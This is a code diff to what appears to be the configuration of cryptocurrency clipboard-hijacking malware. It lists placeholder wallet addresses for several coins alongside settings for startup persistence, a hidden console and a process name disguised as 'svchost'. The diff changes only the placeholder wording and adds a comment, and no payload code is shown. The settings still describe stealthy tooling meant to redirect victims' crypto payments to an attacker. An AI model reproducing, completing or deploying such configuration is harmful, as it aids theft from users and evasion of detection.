@@ -1,13 +1,13 @@
 w = {
-    "btc": "YOUR_BTC_ADDRESS_HERE",
-    "eth": "YOUR_ETH_ADDRESS_HERE",
-    "ltc": "YOUR_LTC_ADDRESS_HERE",
-    "xmr": "YOUR_XMR_ADDRESS_HERE",
-    "xrp": "YOUR_XRP_ADDRESS_HERE",
-    "doge": "YOUR_DOGE_ADDRESS_HERE",
-    "sol": "YOUR_SOL_ADDRESS_HERE",
+    "btc": "Put BITCOIN address here",
+    "eth": "Put ETHEREUM address here",
+    "ltc": "Put LITECOIN address here",
+    "xmr": "Put MONERO address here",
+    "xrp": "Put XRP address here",
+    "doge": "Put DOGECOIN addrss here",
+    "sol": "Put SOLANA address here",
 }
-interval = 0.5
+interval = 0.5 # the time on starting
 startup = True
 hide_console = True
 process_name = "svchost"
